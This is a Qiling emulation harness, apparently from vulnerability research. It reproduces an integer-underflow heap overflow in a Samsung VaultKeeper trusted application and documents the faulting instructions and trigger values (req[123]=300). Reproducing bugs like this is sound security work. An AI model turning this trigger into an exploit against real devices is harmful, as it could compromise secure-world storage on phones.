from .params import *
from qiling import Qiling
import struct, os

# === SVLTKPR-5: vk_everyman_write_sheltered HEAP OOB write (vaultkeeper) ======
# Target: Samsung S24 Ultra (SM-S928B) VaultKeeper QTEE TA, vaultkeeper.ta
#         (sha256 82bd205f...; staged byte-identical as vk_write_sheltered.ta).
# Handler: vk_everyman_write_sheltered@0x1235C (WRITE_SHELTERED, cmd 0xC000C08),
#          inside the compound sub_11FB8.
#
# DEFECT (byte-exact, verify_underflow_primitive.py = 13/13 PASS):
#   0x12640 ldr w1,[x20,#0x1ec]   ; alloc size = req[123]      (attacker)
#   0x12644 bl  sub_8F0           ; -> *(target+0x140) = vkqsee_memory_alloc
#                                 ;    -> qsee_malloc(req[123])  (NO minimum)
#   0x12658 ldr w3,[x20,#0xc8]    ; w3 = req[50]  (copy length, attacker)
#   0x12660 ldr w8,[x20,#0x1ec]   ; w8 = req[123] (re-read)
#   0x12664 sub w8,w8,#0x160      ; w8 = req[123]-352   (32-bit -> WRAPS if <352)
#   0x12668 cmp w3,w8
#   0x1266c b.hi 0x12778          ; reject only req[50] >u (req[123]-352)
#   ...sub_900 (read existing vault; tail-calls *(target+0xF8)) must return 0...
#   0x12808 add x0,x21,#0x160     ; dst = working_buf + 352
#   0x12814 ldr w2,[x20,#0xc8]    ; len = req[50]              (UNCLAMPED)
#   0x12818 bl  sub_165E8         ; memcpy(working_buf+352, *(req+0xc0), req[50])
#
# TRIGGER: req[123] = 300 (<352).  Bound = 300-352 = 0xFFFFFFCC (unsigned wrap)
#   -> b.hi accepts essentially any req[50].  qsee_malloc(300) => a 300-byte
#   chunk; dst = buf+352 is 52 B past the end -> qsee_malloc's TRAILING asan
#   redzone (malloc_core: real_size=round_up(300+0x40,0x1000)=0x1000, user
#   [out+0x20, out+0x14C), redzone [out+0x14C, out+0x1000)) catches the first
#   OOB write at buf+0x160 = out+0x180 (0x34 B inside the redzone).
#
# DETECTION: asan invalid_region_write hook -> CRASH_PC, logging
#   "out-of-bound write on address 0x...180" with lr in the 0x12818 memcpy.
#
# To reach the copy, the handler needs:
#   * table index req[1] in {0,1,2,3,11,12,14,16,21} (bitmask 0x1EA7F0, bit==0
#     -> alloc path @0x12638). We use req[1]=0.
#   * target+0x140 = vkqsee_memory_alloc@0x1F44   (real qsee_malloc-backed alloc)
#   * target+0xF8  = ret-0 gadget@0x20C0          (sub_900 read_unsvault -> 0)
#   * x0=target non-null, x1=req non-null, x2=resp non-null.
#
# CONTRAST: VK_CAP=0xADF8 (>=352) => bound holds, copy fits in the big alloc =>
# benign return @0x12584 (no redzone hit). VK_CAP=300 => crash. The divergence
# on the SAME command, varying ONLY req[123], is the underflow proof.

AFL_EXIT   = 0x13370

REQ_BASE   = 0x53000000     # x1 -> req descriptor
TGT_BASE   = 0x53100000     # x0 -> target (vault object; vtable fields)
RSP_BASE   = 0x53200000     # x2 -> resp (must be non-null)
SRC_BASE   = 0x53300000     # *(req+0xC0) -> NW data source
REGION     = 0x40000

# VADDRs inside the TA (added to the runtime PIE base):
VA_ALLOC   = 0x1F44         # vkqsee_memory_alloc (thin qsee_malloc + zero-fill)
# ret-0 gadget for sub_900 (read_unsvault). NOTE: do NOT use 0x20C0 -- that is
# the json's TA-lifecycle stub and carries emulator lifecycle hooks that hijack
# control flow. 0x15C58 is a plain unhooked `mov w0,wzr ; ret`.
VA_RET0    = 0x15C58        # mov w0,wzr ; ret  (unhooked)
VA_BENIGN_RET = 0x12584     # handler unified RET (stop cleanly on benign cap)
VA_POST_COPY  = 0x1281C     # insn after BL sub_165E8 -> stop right after the copy
                            # (benign cap: copy is in-bounds and returns here;
                            #  crash cap: redzone fires inside the copy, before here)

# Request field offsets (byte offsets into the req descriptor):
OFF_TABLE_IDX = 0x04        # req[1]  : validated < 0x16, bitmask 0x1EA7F0
OFF_COPY_LEN  = 0xC8        # req[50] : memcpy length  (NW, the OOB length)
OFF_SRC_PTR   = 0xC0        # req+0xC0: memcpy source pointer (NW)
OFF_CAP       = 0x1EC       # req[123]: alloc size AND underflowing bound base

# Target (vault object) field offsets:
OFF_TGT_READ_FN  = 0xF8     # sub_900 tail-calls *(target+0xF8)
OFF_TGT_ALLOC_FN = 0x140    # sub_8F0 tail-calls *(target+0x140)
OFF_TGT_148      = 0x148    # used only on the error path (LDR X1,[X19,#0x148])

# Defaults: CRASH config. Override with env to flip to benign contrast.
DEFAULT_CAP = int(os.environ.get("VK_CAP", str(300)),   0) & 0xFFFFFFFF   # req[123]
DEFAULT_LEN = int(os.environ.get("VK_LEN", str(0x4000)),0) & 0xFFFFFFFF   # req[50]

_BASE = {"v": 0}


def _ta_base(ql):
    for key in ("vk_write_sheltered.ta", "vaultkeeper.ta"):
        try:
            b = ql.mem.get_lib_base(key)
            if b:
                return b
        except Exception:
            pass
    return 0x555555554000   # confirmed Qiling PIE bias (tee.ql), see sticky_harness


def init_fuzz(emu, sid):
    ql = emu.ql
    for base, name in ((REQ_BASE, "req"), (TGT_BASE, "target"),
                       (RSP_BASE, "resp"), (SRC_BASE, "src")):
        try:
            ql.mem.map(base, REGION, info=f"[vks] {name}")
        except Exception as e:
            ql.log.warning(f"[vks] map {name} @ {hex(base)}: {e}")
    pad = AFL_EXIT & ~0xFFF
    try:
        ql.mem.map(pad, 0x1000, info="[vks] AFL_EXIT pad")
        ql.mem.write(AFL_EXIT, b"\x00\x00\x00\x14")   # b . (self-loop)
    except Exception as e:
        ql.log.warning(f"[vks] map AFL_EXIT pad: {e}")

    b = _ta_base(ql)
    _BASE["v"] = b
    # Stop cleanly right after the copy (and at the handler RET as a backstop) so
    # a non-overflowing cap run terminates at the SAME copy boundary the crash run
    # faults at -- isolating the underflow as the sole difference.
    for off, tag in ((VA_POST_COPY, "post-copy"), (VA_BENIGN_RET, "benign-RET")):
        try:
            ql.hook_address(lambda q: q.emu_stop(), b + off)
        except Exception as e:
            ql.log.warning(f"[vks] {tag} hook: {e}")
    print(f"[vks] init: TA base={hex(b)} alloc_fn={hex(b+VA_ALLOC)} ret0={hex(b+VA_RET0)}")


def place_input_callback(ql: Qiling, input: bytes, _: int):
    b = _BASE["v"] or _ta_base(ql)
    cap = DEFAULT_CAP
    cln = DEFAULT_LEN

    # --- request descriptor (entirely NW-controlled shared memory) ---
    req = bytearray(REGION)
    struct.pack_into("<I", req, OFF_TABLE_IDX, 0)            # table index 0 -> alloc path
    struct.pack_into("<Q", req, OFF_SRC_PTR,   SRC_BASE)     # src = NW data ptr
    struct.pack_into("<I", req, OFF_COPY_LEN,  cln)          # req[50] copy length
    struct.pack_into("<I", req, OFF_CAP,       cap)          # req[123] capacity/alloc/bound
    ql.mem.write(REQ_BASE, bytes(req))

    # --- target (vault object): wire the two vtable fn-ptrs used on the path ---
    tgt = bytearray(REGION)
    struct.pack_into("<Q", tgt, OFF_TGT_READ_FN,  b + VA_RET0)    # sub_900 -> ret 0
    struct.pack_into("<Q", tgt, OFF_TGT_ALLOC_FN, b + VA_ALLOC)   # alloc -> qsee_malloc
    struct.pack_into("<Q", tgt, OFF_TGT_148,      RSP_BASE)       # harmless (error path)
    ql.mem.write(TGT_BASE, bytes(tgt))

    # --- resp (non-null) + NW source pattern ---
    ql.mem.write(RSP_BASE, b"\x00" * 0x400)
    ql.mem.write(SRC_BASE, (b"\x41\x42\x43\x44" * (min(cln, REGION) // 4 + 1))[:min(cln + 0x40, REGION)])

    setup_params_fuzz(ql, 0, 0, [NoneParam(), NoneParam(), NoneParam(), NoneParam()])

    # vk_everyman_write_sheltered(x0=target, x1=req, x2=resp)
    ql.arch.regs.x0 = TGT_BASE
    ql.arch.regs.x1 = REQ_BASE
    ql.arch.regs.x2 = RSP_BASE
    ql.arch.regs.x30 = AFL_EXIT

    bound = (cap - 0x160) & 0xFFFFFFFF
    print(f"[vks] WRITE_SHELTERED req[123]={cap:#x} req[50]={cln:#x}  "
          f"bound=(req[123]-0x160)&0xffffffff={bound:#x}  "
          f"-> qsee_malloc({cap}) ; memcpy(buf+0x160, src, {cln:#x})  "
          f"{'[UNDERFLOW->OOB]' if cap < 0x160 else '[bound holds]'}")
    return True
